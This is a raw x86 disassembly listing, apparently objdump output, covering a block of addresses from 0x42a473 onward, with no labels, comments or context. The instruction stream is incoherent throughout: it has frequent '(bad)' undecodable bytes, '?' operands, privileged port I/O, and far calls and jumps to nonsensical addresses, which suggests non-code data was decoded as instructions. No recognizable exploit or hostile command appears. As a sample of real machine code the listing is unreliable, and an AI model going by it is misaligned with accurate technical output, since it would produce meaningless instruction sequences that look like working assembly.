  42a473:	jp     0x42a4ed
  42a475:	add    eax,0xd1bc6827
  42a47a:	xchg   esp,eax
  42a47b:	pop    ds
  42a47c:	pop    ebp
  42a47d:	std    
  42a47e:	sbb    BYTE PTR [ebx],al
  42a480:	rcr    BYTE PTR [ebp-0x131525b9],0x61
  42a487:	shr    DWORD PTR [ebx-0x6f],cl
  42a48a:	mov    dh,0x56
  42a48c:	mov    bh,0x5b
  42a48e:	cmp    eax,0xcd2aa8dc
  42a493:	sbb    ah,0xbf
  42a496:	stos   BYTE PTR es:[edi],al
  42a497:	and    bl,BYTE PTR [esi]
  42a499:	add    eax,0x2b1d212c
  42a49e:	out    dx,eax
  42a49f:	inc    esi
  42a4a0:	sbb    al,BYTE PTR [ebp-0x1901334d]
  42a4a6:	iret   
  42a4a7:	cmp    esi,DWORD PTR [esi+0x4e]
  42a4aa:	add    DWORD PTR [ecx-0x231a163d],ebx
  42a4b0:	sbb    al,BYTE PTR [eax+0x3c]
  42a4b3:	ret    0x7
	...
  42a516:	sbb    BYTE PTR [edi+0x17],cl
  42a519:	mov    ecx,0xefbef957
  42a51e:	mov    cl,0xd7
  42a520:	dec    ebp
  42a521:	add    dh,ch
  42a523:	into   
  42a524:	xchg   esi,eax
  42a525:	jg     0x42a59d
  42a527:	les    eax,FWORD PTR [ecx]
  42a529:	add    BYTE PTR [edi],al
  42a52b:	add    DWORD PTR [eax],eax
  42a52d:	add    BYTE PTR [edx],al
  42a52f:	mov    esp,edi
  42a531:	push   esi
  42a532:	(bad)  
  42a533:	fiadd  DWORD PTR [ebp-0x6fa6dd95]
  42a539:	mov    ecx,esp
  42a53b:	fs mov al,0xc5
  42a53e:	mov    eax,ds:0xecc51460
  42a543:	jnp    0x42a546
  42a545:	aas    
  42a546:	sbb    DWORD PTR ds:[esi-0x5b],esp
  42a54a:	mov    dl,0x35
  42a54c:	lock jg 0x42a5ba
  42a54f:	lods   eax,DWORD PTR ds:[esi]
  42a550:	(bad)  
  42a552:	mov    eax,0xb4c68dde
  42a557:	mov    edi,0xe4621533
  42a55c:	das    
  42a55d:	cdq    
  42a55e:	xor    BYTE PTR [esi+ebx*2-0x6a0a6e1b],al
  42a565:	mov    dl,0x8d
  42a567:	ja     0x42a5a1
  42a569:	inc    ebp
  42a56a:	or     DWORD PTR [ebx],ebx
  42a56c:	jnp    0x42a56b
  42a56e:	cmp    DWORD PTR [edi+eax*2+0x61b52fee],edx
  42a575:	mov    ah,0x41
  42a577:	or     ebx,edi
  42a579:	sbb    al,BYTE PTR [ebp+esi*4+0x60]
  42a57d:	scas   al,BYTE PTR es:[edi]
  42a57e:	daa    
  42a57f:	jge    0x42a5e1
  42a581:	out    0x5f,eax
  42a583:	mov    al,ds:0xcf6ef3f6
  42a588:	cli    
  42a589:	xor    al,0x89
  42a58b:	mov    ?,WORD PTR [ebp+0x63]
  42a58e:	add    eax,0x2923a340
  42a593:	jg     0x42a597
  42a595:	pop    ecx
  42a596:	cld    
  42a597:	push   esp
  42a598:	ins    DWORD PTR es:[edi],dx
  42a599:	pop    edi
  42a59a:	lods   al,BYTE PTR ds:[esi]
  42a59b:	fcmovu st,st(1)
  42a59d:	retf   
  42a59e:	jne    0x42a570
  42a5a0:	mov    WORD PTR [edi+ebp*2],ss
  42a5a3:	and    eax,0x1753f28f
  42a5a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a5a9:	adc    dl,al
  42a5ab:	sbb    DWORD PTR [edi],0xf5fe2af4
  42a5b1:	cmp    BYTE PTR [ebx],dl
  42a5b3:	shr    DWORD PTR [edi-0x3dca9e6d],0xd1
  42a5ba:	cmp    DWORD PTR [ebp+0x57f4d4a3],ecx
  42a5c0:	push   cs
  42a5c1:	mov    dl,dl
  42a5c3:	rcl    BYTE PTR [eax],0xa2
  42a5c6:	ret    0x5805
  42a5c9:	xchg   ebp,eax
  42a5ca:	mov    WORD PTR [ecx],?
  42a5cc:	lock inc ecx
  42a5ce:	xchg   esi,eax
  42a5cf:	push   edx
  42a5d0:	xlat   BYTE PTR ds:[ebx]
  42a5d1:	mov    esp,0xc5af0846
  42a5d6:	mov    eax,ds:0xcc7eee91
  42a5db:	sub    DWORD PTR [esi-0x3e],eax
  42a5de:	call   0xe28abdb5
  42a5e3:	or     eax,0x6b04f7df
  42a5e8:	jno    0x42a56b
  42a5ea:	sub    bh,BYTE PTR [esi]
  42a5ec:	cmp    eax,0x737905f8
  42a5f1:	mul    edx
  42a5f3:	mov    ch,0x84
  42a5f5:	fmulp  st(5),st
  42a5f7:	xchg   esp,eax
  42a5f8:	fisttp QWORD PTR [ebp-0x7e]
  42a5fb:	inc    eax
  42a5fc:	shl    BYTE PTR [edi],cl
  42a5fe:	imul   ecx,DWORD PTR [ecx-0x6d068d99],0xe7eafb63
  42a608:	fisubr DWORD PTR [edi+0x5e]
  42a60b:	push   ebp
  42a60c:	nop
  42a60d:	cmp    eax,DWORD PTR [edi+0x4c]
  42a610:	or     DWORD PTR [eax],ebx
  42a612:	cmp    eax,0xb16e3d08
  42a617:	mov    eax,ds:0xc703def1
  42a61c:	mov    bl,0x62
  42a61e:	repnz bound edx,QWORD PTR [edi+0x1a]
  42a622:	mov    al,0x81
  42a624:	xor    al,0xc5
  42a626:	xor    BYTE PTR [ebx+0x3f],ah
  42a629:	sti    
  42a62a:	jne    0x42a69e
  42a62c:	scas   al,BYTE PTR es:[edi]
  42a62d:	in     eax,dx
  42a62e:	es push eax
  42a630:	jbe    0x42a60d
  42a632:	test   al,0x81
  42a634:	ret    0x0
	...
  42a693:	add    BYTE PTR [eax],al
  42a695:	add    BYTE PTR [esi+edx*1],ah
  42a698:	outs   dx,BYTE PTR ds:[esi]
  42a699:	(bad)  
  42a69a:	jle    0x42a69b
  42a69c:	lods   eax,DWORD PTR ds:[esi]
  42a69d:	test   DWORD PTR [edi],0x3e67323b
  42a6a3:	inc    eax
  42a6a4:	outs   dx,DWORD PTR ds:[esi]
  42a6a5:	mov    edi,0x1c57d
  42a6aa:	pop    es
  42a6ab:	add    DWORD PTR [eax],eax
  42a6ad:	add    BYTE PTR [ebp+0x47830e89],ch
  42a6b3:	retf   
  42a6b4:	inc    eax
  42a6b5:	in     eax,0x3d
  42a6b7:	mov    DWORD PTR [edx-0x3b],ebp
  42a6ba:	pushf  
  42a6bb:	mov    dl,0x18
  42a6bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a6be:	pop    edx
  42a6bf:	cmp    al,0x8d
  42a6c1:	and    ah,bl
  42a6c3:	sub    DWORD PTR [ebx+eax*1+0xfd6dbf6],eax
  42a6ca:	mov    ah,0xf2
  42a6cc:	cmp    edi,DWORD PTR [ecx+eiz*8-0x2b]
  42a6d0:	loope  0x42a71a
  42a6d2:	add    ecx,ecx
  42a6d4:	adc    BYTE PTR [ebp-0x4fa80379],cl
  42a6da:	imul   DWORD PTR [ebp+0x6e]
  42a6dd:	xor    bl,BYTE PTR [edx+0x47dd267b]
  42a6e3:	mov    bl,BYTE PTR [esi]
  42a6e5:	mov    WORD PTR [edx],?
  42a6e7:	cmp    eax,0x4fbbb651
  42a6ec:	stc    
  42a6ed:	fld    TBYTE PTR [ebp-0x2661b38a]
  42a6f3:	adc    eax,0x90d0cc9f
  42a6f8:	bsr    eax,DWORD PTR [esi]
  42a6fb:	mov    ebp,0x56b21dcd
  42a700:	sti    
  42a701:	push   edx
  42a702:	or     BYTE PTR [edx-0x7e],al
  42a705:	xor    dh,BYTE PTR [esi]
  42a707:	loope  0x42a6ee
  42a709:	dec    ebx
  42a70a:	or     esi,ebx
  42a70c:	popa   
  42a70d:	pop    ebp
  42a70e:	push   0x8ff7adc5
  42a713:	loop   0x42a73c
  42a715:	mov    edi,0xec33359b
  42a71a:	push   edi
  42a71b:	loopne 0x42a6be
  42a71d:	(bad)  
  42a71e:	jmp    0x42a6da
  42a720:	dec    ebp
  42a721:	xchg   ecx,eax
  42a722:	jns    0x42a718
  42a724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a725:	adc    eax,esp
  42a727:	dec    edx
  42a728:	jecxz  0x42a6d5
  42a72a:	cld    
  42a72b:	imul   edx,DWORD PTR [ebx],0x3b1ce6c7
  42a731:	jp     0x42a776
  42a733:	dec    esp
  42a734:	test   al,0x8d
  42a736:	rcl    DWORD PTR [ecx],0xbd
  42a739:	popa   
  42a73a:	mov    ebx,0xe85a425f
  42a73f:	loopne 0x42a72a
  42a741:	test   ah,al
  42a743:	je     0x42a6cc
  42a745:	inc    ecx
  42a746:	int3   
  42a747:	jo     0x42a76b
  42a749:	push   edx
  42a74a:	inc    esi
  42a74b:	xor    al,0x61
  42a74d:	inc    esi
  42a74e:	and    eax,ebx
  42a750:	xchg   ecx,eax
  42a751:	into   
  42a752:	ins    DWORD PTR es:[edi],dx
  42a753:	push   ss
  42a754:	nop
  42a755:	mov    ebx,0xd89102d6
  42a75a:	outs   dx,BYTE PTR ds:[esi]
  42a75b:	out    0x7d,al
  42a75d:	add    BYTE PTR [esp+eax*4],0x51
  42a761:	in     al,dx
  42a762:	fistp  DWORD PTR [esi]
  42a764:	pushf  
  42a765:	mov    eax,ds:0xe7741201
  42a76a:	sub    eax,0xde09240
  42a76f:	fldcw  WORD PTR [esi+0x17241c0f]
  42a775:	ret    
  42a776:	xor    BYTE PTR [ebx],dl
  42a778:	mov    esp,0xd3c75644
  42a77d:	loope  0x42a767
  42a77f:	(bad)  
  42a780:	pop    ecx
  42a781:	psubusw mm5,mm0
  42a784:	mov    ch,0x22
  42a786:	push   es
  42a787:	daa    
  42a788:	aad    0x68
  42a78a:	xor    edi,ecx
  42a78c:	pop    edx
  42a78d:	sahf   
  42a78e:	jle    0x42a712
  42a790:	or     DWORD PTR [eax],0x84a58a52
  42a796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a797:	retf   
  42a798:	sub    al,BYTE PTR [esi-0x76]
  42a79b:	jl     0x42a7bf
  42a79d:	fcomp  QWORD PTR [edi-0x5d]
  42a7a0:	mov    dl,0xaf
  42a7a2:	add    edi,esi
  42a7a4:	enter  0x5e6a,0x18
  42a7a8:	(bad)  
  42a7a9:	jp     0x42a739
  42a7ab:	out    dx,eax
  42a7ac:	aam    0xd4
  42a7ae:	inc    ebp
  42a7af:	sbb    BYTE PTR [edx-0x5173bfdf],0x0
	...
  42a816:	mov    ah,BYTE PTR [ebp+0x63]
  42a819:	mov    edi,0x75debfef
  42a81e:	jp     0x42a869
  42a820:	arpl   WORD PTR [ebx],sp
  42a822:	fldz   
  42a824:	push   cs
  42a825:	jae    0x42a7ab
  42a827:	mov    BYTE PTR [ecx],0x0
  42a82a:	pop    es
  42a82b:	add    DWORD PTR [eax],eax
  42a82d:	add    BYTE PTR ds:0x13b61e8f,ah
  42a833:	rcr    DWORD PTR [edi],1
  42a835:	sbb    BYTE PTR [ecx-0x15664961],dh
  42a83b:	and    eax,0x4c10ab50
  42a840:	cmp    ecx,DWORD PTR [eax+0x16]
  42a843:	sar    BYTE PTR [eax],0x21
  42a846:	aas    
  42a847:	mov    WORD PTR [eax-0x169f0a63],ss
  42a84d:	cli    
  42a84e:	int3   
  42a84f:	or     eax,0xdf3a0b0b
  42a854:	dec    ecx
  42a855:	setne  BYTE PTR [ebx+edx*2]
  42a859:	lds    ebx,FWORD PTR [edx-0x61]
  42a85c:	inc    ecx
  42a85d:	push   0xf743851e
  42a862:	mov    ebx,0x6bb4bcb8
  42a867:	pop    ebp
  42a868:	mov    cl,0x33
  42a86a:	mov    ds:0xa74abbaf,eax
  42a86f:	lahf   
  42a870:	bound  edx,QWORD PTR [edi+0x13379bc4]
  42a876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a877:	ins    BYTE PTR es:[edi],dx
  42a878:	mov    edi,0xffb69519
  42a87d:	and    al,0x5
  42a87f:	jne    0x42a8b3
  42a881:	fincstp 
  42a883:	dec    eax
  42a884:	mov    ebx,0x1750292f
  42a889:	pop    ebp
  42a88a:	lea    esi,[ebx+0x42dfd9a1]
  42a890:	xor    al,0xd0
  42a892:	sub    eax,DWORD PTR [edi+0x5a5846b3]
  42a898:	xchg   esi,eax
  42a899:	shl    esi,cl
  42a89b:	pop    es
  42a89c:	mov    edi,0x9bdf7412
  42a8a2:	xchg   edi,eax
  42a8a3:	test   BYTE PTR [ebx+0x2f9378d9],al
  42a8a9:	xchg   DWORD PTR [eax+0x7d],ebx
  42a8ac:	inc    edi
  42a8ad:	push   0xb19c4205
  42a8b2:	pop    es
  42a8b3:	outs   dx,WORD PTR ds:[esi]
  42a8b5:	jmp    0x42a883
  42a8b7:	imul   ecx,DWORD PTR [ecx-0x168f5c8],0xffffffbb
  42a8be:	push   ebp
  42a8bf:	lods   eax,DWORD PTR ds:[esi]
  42a8c0:	rcl    DWORD PTR [ebx+0x3e88e561],0xe3
  42a8c7:	lock cs mov ah,0xa4
  42a8cb:	call   0x8e1134ad
  42a8d0:	test   ah,ah
  42a8d2:	push   edx
  42a8d3:	mov    ch,0xf1
  42a8d5:	into   
  42a8d6:	enter  0x43f1,0xba
  42a8da:	add    dh,BYTE PTR [ebx-0x45]
  42a8dd:	dec    esi
  42a8de:	mov    edx,0xc1288e9a
  42a8e3:	mov    ebp,DWORD PTR [edx+0x26]
  42a8e6:	adc    DWORD PTR [edi+0x44],esp
  42a8e9:	push   es
  42a8ea:	cmp    esi,DWORD PTR ds:0xc32b5edb
  42a8f0:	mov    eax,ds:0x53323f20
  42a8f5:	cwde   
  42a8f6:	ins    BYTE PTR es:[edi],dx
  42a8f7:	pop    edi
  42a8f8:	mov    ah,0xdf
  42a8fa:	gs mov ch,0xdc
  42a8fd:	jecxz  0x42a902
  42a8ff:	cmp    BYTE PTR [edx],bl
  42a901:	sub    DWORD PTR [esi+0x3d],eax
  42a904:	jp     0x42a8bf
  42a906:	stos   DWORD PTR es:[edi],eax
  42a907:	cmp    BYTE PTR [edx+0x72492dbf],bh
  42a90d:	mov    edi,0x3cd5ccda
  42a912:	cmc    
  42a913:	push   edx
  42a914:	nop
  42a915:	jne    0x42a8b5
  42a917:	mov    eax,0x2671cb87
  42a91c:	sub    ebp,esp
  42a91e:	sbb    eax,DWORD PTR [ebx]
  42a920:	lea    ecx,[edx+0x2ec090e0]
  42a926:	xor    DWORD PTR [ebx+edi*4-0x22b92b9f],esp
  42a92d:	inc    ebx
  42a92e:	inc    esi
  42a92f:	sar    edi,1
  42a931:	(bad)  
  42a933:	pop    esi
  42a934:	je     0x42a936
	...
  42a996:	test   al,0x93
  42a998:	sbb    eax,0xfbee3fee
  42a99d:	xlat   BYTE PTR ds:[ebx]
  42a99e:	push   esi
  42a99f:	aam    0xbc
  42a9a1:	or     ecx,DWORD PTR [esi-0x743b2560]
  42a9a7:	mov    DWORD PTR [ecx],0x10700
  42a9ad:	add    BYTE PTR [edx-0x19],cl
  42a9b0:	adc    al,0x91
  42a9b2:	dec    ebx
  42a9b3:	(bad)  
  42a9b4:	(bad)  
  42a9b5:	je     0x42a9b8
  42a9b7:	test   DWORD PTR ds:0x6f9c9808,0x3991f045
  42a9c1:	dec    esp
  42a9c2:	cmp    al,0x33
  42a9c4:	in     al,dx
  42a9c5:	test   BYTE PTR [eax+0x2227982a],ch
  42a9cb:	mov    esp,0x25a127e
  42a9d0:	call   0x266c:0x77cc402f
  42a9d7:	jp     0x42aa37
  42a9d9:	pop    ss
  42a9da:	jae    0x42a9f6
  42a9dc:	sbb    dl,BYTE PTR [edx]
  42a9de:	adc    DWORD PTR [eax-0x61],esi
  42a9e1:	mov    esp,0xe1a48e9b
  42a9e6:	stos   DWORD PTR es:[edi],eax
  42a9e7:	pop    ebx
  42a9e8:	addr16 popa 
  42a9ea:	addr16 retf 0xe167
  42a9ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a9ef:	xchg   esp,eax
  42a9f0:	sub    BYTE PTR [edi+0x2f],ah
  42a9f3:	ret    0xbff0
  42a9f6:	das    
  42a9f7:	js     0x42aa5f
  42a9f9:	mov    edi,0x217a5f95
  42a9fe:	sbb    al,0x87
  42aa00:	mov    ss,WORD PTR [ebp+0x21]
  42aa03:	fadd   st,st(7)
  42aa05:	(bad)  
  42aa06:	push   ss
  42aa07:	into   
  42aa08:	loop   0x42a995
  42aa0a:	dec    ebp
  42aa0b:	outs   dx,BYTE PTR ds:[esi]
  42aa0c:	sti    
  42aa0d:	aam    0x79
  42aa0f:	dec    esi
  42aa10:	out    0xcf,al
  42aa12:	jno    0x42a9c8
  42aa14:	add    ecx,DWORD PTR [ebp+0x1e960ebf]
  42aa1a:	push   eax
  42aa1b:	popa   
  42aa1c:	add    DWORD PTR [edx+0x76703f4a],0x23
  42aa23:	stc    
  42aa24:	pop    ebx
  42aa25:	inc    ebx
  42aa26:	pushf  
  42aa27:	cli    
  42aa28:	dec    esp
  42aa29:	inc    esp
  42aa2a:	mov    ecx,0x5dad901a
  42aa2f:	jae    0x42aa08
  42aa31:	into   
  42aa32:	(bad)  
  42aa34:	jbe    0x42aaa7
  42aa36:	jp     0x42aa20
  42aa38:	cs pop ebp
  42aa3a:	(bad)  [esi]
  42aa3c:	outs   dx,BYTE PTR ds:[esi]
  42aa3d:	stc    
  42aa3e:	cwde   
  42aa3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa40:	je     0x42aa6a
  42aa42:	push   ds
  42aa43:	shr    BYTE PTR [ecx-0x62baaf12],cl
  42aa49:	daa    
  42aa4a:	(bad)
  42aa4d:	mov    BYTE PTR [esi],ah
  42aa4f:	jmp    0x7ce4a097
  42aa54:	push   esp
  42aa55:	xor    eax,0xe6099d46
  42aa5a:	sub    eax,DWORD PTR [ebp-0x503e4e2d]
  42aa60:	(bad)  
  42aa61:	xor    BYTE PTR [edx+0x19efd959],0x80
  42aa68:	mov    ah,bh
  42aa6a:	ret    
  42aa6b:	fnsave [esi-0x1]
  42aa6e:	pop    eax
  42aa6f:	push   0x4e4f9015
  42aa74:	xchg   esp,eax
  42aa75:	inc    esi
  42aa76:	pop    ebx
  42aa77:	mov    ah,0x73
  42aa79:	or     DWORD PTR [ebx+0x7b],0x37d9aa34
  42aa80:	out    0x9c,eax
  42aa82:	inc    ecx
  42aa83:	jmp    0xa687fe6c
  42aa88:	and    DWORD PTR [esi+0xd819523],edi
  42aa8e:	popa   
  42aa8f:	stc    
  42aa90:	(bad)  
  42aa91:	aas    
  42aa92:	aam    0xe7
  42aa94:	sub    BYTE PTR [edx+ecx*1-0x6b4be456],dh
  42aa9b:	xor    eax,0x42b4c9de
  42aaa0:	call   DWORD PTR [esi-0x1570308f]
  42aaa6:	push   ebp
  42aaa7:	sbb    ecx,eax
  42aaa9:	(bad)  
  42aaaa:	xchg   edi,eax
  42aaab:	in     eax,0xa2
  42aaad:	test   al,0x57
  42aaaf:	test   al,0x77
  42aab1:	add    bh,BYTE PTR [eax]
  42aab3:	inc    esp
  42aab4:	adc    BYTE PTR [eax],al
	...
  42ab16:	ds push cs
  42ab18:	sub    al,0x5d
  42ab1a:	cmp    al,0x7f
  42ab1c:	jg     0x42ab8d
  42ab1e:	dec    eax
  42ab1f:	das    
  42ab20:	pop    edi
  42ab21:	mov    DWORD PTR [edi],ebp
  42ab23:	push   eax
  42ab24:	mov    DWORD PTR [ebp+0x1c892],esp
  42ab2a:	pop    es
  42ab2b:	add    DWORD PTR [eax],eax
  42ab2d:	add    BYTE PTR [ecx],bl
  42ab2f:	mov    ecx,0x26e7878a
  42ab34:	call   0xb9bb:0x17e948d4
  42ab3b:	js     0x42ab36
  42ab3d:	jne    0x42ab2f
  42ab3f:	dec    ecx
  42ab40:	pop    ebp
  42ab41:	xor    DWORD PTR [eax-0x18],esi
  42ab44:	retf   
  42ab45:	outs   dx,BYTE PTR ds:[esi]
  42ab46:	mov    cs,WORD PTR [edx+0x52001376]
  42ab4c:	push   es
  42ab4d:	lea    ecx,[eax]
  42ab4f:	mov    ebp,0x69bdb8e1
  42ab54:	daa    
  42ab55:	fwait
  42ab56:	and    ah,BYTE PTR [ebx+0x3]
  42ab59:	pop    es
  42ab5a:	into   
  42ab5b:	je     0x42ab26
  42ab5d:	les    ecx,FWORD PTR [edx-0x1249497b]
  42ab63:	push   ebp
  42ab64:	idiv   DWORD PTR [ecx+0x1e]
  42ab67:	into   
  42ab68:	shl    DWORD PTR [ecx-0x3e],0xeb
  42ab6c:	xchg   edx,eax
  42ab6d:	push   cs
  42ab6e:	xor    DWORD PTR [ecx-0x45641c6b],edi
  42ab74:	ffree  st(1)
  42ab76:	dec    ecx
  42ab77:	or     DWORD PTR [ebx-0x2a8148c1],ecx
  42ab7d:	ss je  0x42ab68
  42ab80:	shr    BYTE PTR [edx],cl
  42ab82:	dec    esi
  42ab83:	cwde   
  42ab84:	pop    es
  42ab85:	scas   al,BYTE PTR es:[edi]
  42ab86:	fidivr WORD PTR [eax]
  42ab88:	pop    es
  42ab89:	or     BYTE PTR [ecx-0x26987d56],dh
  42ab8f:	add    DWORD PTR [eax],ebp
  42ab91:	mov    ecx,0x968bdb8f
  42ab96:	stos   DWORD PTR es:[edi],eax
  42ab97:	std    
  42ab98:	mov    al,0x2a
  42ab9a:	mov    eax,0xd7e3d699
  42ab9f:	and    bl,BYTE PTR [edx]
  42aba1:	repz mov bh,0xdd
  42aba4:	lods   eax,DWORD PTR ds:[esi]
  42aba5:	int    0xdd
  42aba7:	out    0x39,eax
  42aba9:	cmp    BYTE PTR [eax],cl
  42abab:	mov    ch,0xf5
  42abad:	(bad)
  42abb0:	jp     0x42ac1a
  42abb2:	adc    DWORD PTR [ecx],eax
  42abb4:	popa   
  42abb5:	out    dx,eax
  42abb6:	aam    0xe8
  42abb8:	inc    ecx
  42abb9:	out    0x3f,eax
  42abbb:	inc    esi
  42abbc:	stc    
  42abbd:	cmc    
  42abbe:	push   edx
  42abbf:	repz (bad) 
  42abc1:	mov    eax,es
  42abc3:	fs loop 0x42ac1c
  42abc6:	add    al,0x95
  42abc8:	repnz and ah,BYTE PTR [esi+esi*4-0x7b]
  42abcd:	and    al,0x71
  42abcf:	in     eax,dx
  42abd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42abd1:	imul   esi,DWORD PTR [ecx-0x1c],0xffffffec
  42abd5:	outs   dx,BYTE PTR ds:[esi]
  42abd6:	inc    edi
  42abd7:	cdq    
  42abd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42abd9:	lods   al,BYTE PTR ds:[esi]
  42abda:	not    BYTE PTR [ebx]
  42abdc:	adc    DWORD PTR [esi],edx
  42abde:	xor    dh,0x48
  42abe1:	dec    eax
  42abe2:	cmp    al,0x7d
  42abe4:	rcr    BYTE PTR [esi-0x73bf70db],1
  42abea:	inc    ebx
  42abeb:	inc    edx
  42abec:	pop    ds
  42abed:	push   ebp
  42abee:	xchg   esp,eax
  42abef:	jne    0x42ab9c
  42abf1:	xchg   ebx,eax
  42abf2:	mov    cl,0xe5
  42abf4:	cmp    esp,DWORD PTR [edi+0x64]
  42abf7:	mov    cl,al
  42abf9:	in     al,0xbe
  42abfb:	out    dx,eax
  42abfc:	(bad)  
  42abfd:	int3   
  42abfe:	(bad)  
  42ac00:	cli    
  42ac01:	mov    bh,0x6e
  42ac03:	test   DWORD PTR [ebx-0x57ebef1d],edi
  42ac09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac0a:	dec    ebx
  42ac0b:	and    edi,DWORD PTR [edx-0x1319e3b7]
  42ac11:	sub    DWORD PTR [edi-0x6af5ece9],0xa8dcf366
  42ac1b:	mov    edi,0x937541
  42ac20:	dec    esi
  42ac21:	inc    edi
  42ac22:	pop    edi
  42ac23:	fstp   QWORD PTR [ecx+0x4bef09da]
  42ac29:	dec    esp
  42ac2a:	adc    esp,eax
  42ac2c:	push   esp
  42ac2d:	jb     0x42ac16
  42ac2f:	xor    eax,0x5b14134e
  42ac34:	popf   
	...
  42ac95:	add    cl,ch
  42ac97:	xor    bl,BYTE PTR [edx+edi*1]
  42ac9a:	fistp  QWORD PTR [esi]
  42ac9c:	out    dx,eax
  42ac9d:	repz rcl BYTE PTR [edi-0x25b8f5a7],cl
  42aca4:	mov    esp,0x1c999a1
  42aca9:	add    BYTE PTR [edi],al
  42acab:	add    DWORD PTR [eax],eax
  42acad:	add    BYTE PTR [ebx+0x6a9266c8],bl
  42acb3:	int    0x81
  42acb5:	add    BYTE PTR [eax],ah
  42acb7:	sahf   
  42acb8:	jmp    0x9da2b047
  42acbd:	and    al,0x36
  42acbf:	xor    ah,ch
  42acc1:	mov    ah,0x6f
  42acc3:	outs   dx,DWORD PTR ds:[esi]
  42acc4:	(bad)  
  42acc5:	push   edi
  42acc6:	adc    BYTE PTR [edx+0x5809be3f],cl
  42accc:	adc    eax,0x8da3567d
  42acd1:	inc    esp
  42acd2:	std    
  42acd3:	jae    0x42acb9
  42acd5:	shr    BYTE PTR ds:0xf3ad7bb2,cl
  42acdb:	sbb    edx,esi
  42acdd:	repnz or eax,0xa427236c
  42ace3:	mov    dl,0x8f
  42ace5:	mov    ch,0xa9
  42ace7:	popf   
  42ace8:	into   
  42ace9:	mov    ds:0x3cbc3018,al
  42acee:	inc    edi
  42acef:	leave  
  42acf0:	ret    0xbb5
  42acf3:	cmp    al,0xd4
  42acf5:	loopne 0x42ac8e
  42acf7:	push   0x61
  42acf9:	mov    eax,ds:0xb7eb2b4a
  42acfe:	push   esi
  42acff:	sbb    bl,ah
  42ad01:	clc    
  42ad02:	repnz imul edx,edx,0xa3bce6fd
  42ad09:	in     eax,0x80
  42ad0b:	jp     0x42aca4
  42ad0d:	hlt    
  42ad0e:	mov    WORD PTR [eax],?
  42ad10:	(bad)
  42ad15:	retf   
  42ad16:	push   cs
  42ad17:	jbe    0x42ad78
  42ad19:	int3   
  42ad1a:	and    al,0xcf
  42ad1c:	mov    ah,0x3d
  42ad1e:	fst    DWORD PTR [ebx+0x325278f8]
  42ad24:	add    ecx,DWORD PTR [esi+esi*2-0x73]
  42ad28:	and    DWORD PTR [edi-0x77],ecx
  42ad2b:	mov    ch,0x4f
  42ad2d:	es in  al,0x64
  42ad30:	jo     0x42adb0
  42ad32:	retf   0xe722
  42ad35:	sahf   
  42ad36:	cmp    eax,0x92baf095
  42ad3b:	fbld   TBYTE PTR [ebp+0x66]
  42ad3e:	(bad)  
  42ad3f:	jae    0x42ad28
  42ad41:	shr    DWORD PTR [ebx],0x25
  42ad44:	jne    0x42ace4
  42ad46:	cmp    eax,DWORD PTR [ebp+0x5637e4a2]
  42ad4c:	and    cl,al
  42ad4e:	dec    edx
  42ad4f:	repnz and al,0xb9
  42ad52:	(bad)  
  42ad53:	(bad)  
  42ad54:	pusha  
  42ad55:	rol    BYTE PTR [ecx],cl
  42ad57:	bound  edi,QWORD PTR [edx-0x43]
  42ad5a:	call   0x5ae3ea58
  42ad5f:	sbb    DWORD PTR [ebp+0x68fe1eb7],ebp
  42ad65:	gs pop ds
  42ad67:	and    BYTE PTR [eax-0x6be0b07b],cl
  42ad6d:	xor    al,al
  42ad6f:	aas    
  42ad70:	je     0x42ad2d
  42ad72:	inc    esi
  42ad73:	call   0x44e7:0x672f8b08
  42ad7a:	mov    dh,0xa4
  42ad7c:	or     DWORD PTR [edx-0xe],eax
  42ad7f:	mov    bl,0x85
  42ad81:	jmp    0xa38d9c2d
  42ad86:	nop
  42ad87:	jge    0x42adb9
  42ad89:	sub    esp,esi
  42ad8b:	sub    DWORD PTR [edx-0x2b],edx
  42ad8e:	js     0x42adb2
  42ad90:	sbb    DWORD PTR [esi-0x751accb],ecx
  42ad96:	and    DWORD PTR [ebp+0x5b],esp
  42ad99:	sbb    al,0x74
  42ad9b:	arpl   WORD PTR [eax-0x385916c8],si
  42ada1:	push   ecx
  42ada2:	pusha  
  42ada3:	pop    esp
  42ada4:	xrelease mov BYTE PTR [ebx+0x5b],bh
  42ada8:	mov    ebx,eax
  42adaa:	inc    edi
  42adab:	push   es
  42adac:	ror    BYTE PTR [edi-0x13],cl
  42adaf:	jae    0x42ad94
  42adb1:	fwait
  42adb2:	leave  
  42adb3:	fs retf 0x0
	...
  42ae13:	add    BYTE PTR [eax],al
  42ae15:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae1b:	mov    edi,0xe6d5f7ff
  42ae20:	and    ebp,DWORD PTR [ebx+ecx*8-0x5f783b45]
  42ae27:	retf   0x1
  42ae2a:	pop    es
  42ae2b:	add    DWORD PTR [eax],eax
  42ae2d:	add    BYTE PTR [esi],bl
  42ae2f:	inc    esi
  42ae30:	mov    edi,0x6e3e5367
  42ae35:	or     ebx,eax
  42ae37:	in     al,dx
  42ae38:	push   edi
  42ae39:	adc    BYTE PTR [ebx+0x67],0x98
  42ae3d:	sub    BYTE PTR es:0x6ea81243,0x2d
  42ae45:	mov    bh,0x4b
  42ae47:	mov    bh,0xea
  42ae49:	icebp  
  42ae4a:	int3   
  42ae4b:	or     ebp,0xffffff9e
  42ae4e:	dec    ebp
  42ae4f:	call   0x8ba62759
  42ae54:	lahf   
  42ae55:	mov    edi,0xd76785df
  42ae5a:	jle    0x42aea4
  42ae5c:	push   ebx
  42ae5d:	sbb    DWORD PTR [eax-0x3fba3a5a],0xffffffba
  42ae64:	call   0xc6ad:0xf94703f7
  42ae6b:	or     DWORD PTR [ecx-0x658bd493],edx
  42ae71:	lods   eax,DWORD PTR ds:[esi]
  42ae72:	sar    BYTE PTR [ebx-0x68],1
  42ae75:	(bad)  
  42ae77:	cmp    BYTE PTR [esi+edx*8-0x5f],cl
  42ae7b:	sub    ebx,DWORD PTR [eax-0x1f84f2a8]
